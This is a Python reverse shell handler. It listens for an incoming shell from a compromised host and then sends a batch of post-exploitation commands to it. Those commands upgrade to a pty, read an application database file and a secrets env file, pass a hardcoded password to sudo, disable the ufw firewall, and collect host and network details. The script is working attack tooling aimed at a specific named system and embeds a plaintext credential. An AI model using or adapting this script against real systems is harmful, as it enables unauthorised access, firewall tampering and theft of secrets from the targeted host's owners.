#!/usr/bin/env python3
"""Bidirectional reverse shell handler."""
import socket
import threading
import sys

HOST = "0.0.0.0"
PORT = int(sys.argv[1]) if len(sys.argv) > 1 else 5555

s = socket.socket()
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind((HOST, PORT))
s.listen(1)
print(f"[*] listening on {PORT}", flush=True)
c, a = s.accept()
print(f"[+] connect from {a}", flush=True)


def recv():
    while True:
        try:
            data = c.recv(4096)
        except Exception:
            break
        if not data:
            break
        sys.stdout.buffer.write(data)
        sys.stdout.flush()


t = threading.Thread(target=recv, daemon=True)
t.start()

# auto-run initial recon
for cmd in [
    "id\n",
    "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'\n",
]:
    c.send(cmd.encode())

# then read commands from stdin file if provided via args file
import time

cmds = [
    "id\n",
    "cat /home/webadmin/aegis/db/sql.js\n",
    "echo 'opc0932k90%%lODFI93-++' | sudo -S id\n",
    "echo 'opc0932k90%%lODFI93-++' | sudo -S ufw disable\n",
    "echo 'opc0932k90%%lODFI93-++' | sudo -S ufw status\n",
    "cat /etc/hosts\n",
    "cat /etc/aegis-render.env\n",
    "ip a\n",
]
time.sleep(1)
for cmd in cmds:
    print(f"\n>>> {cmd.strip()}", flush=True)
    c.send(cmd.encode())
    time.sleep(2)

time.sleep(3)
print("\n[*] done batch", flush=True)
c.close()
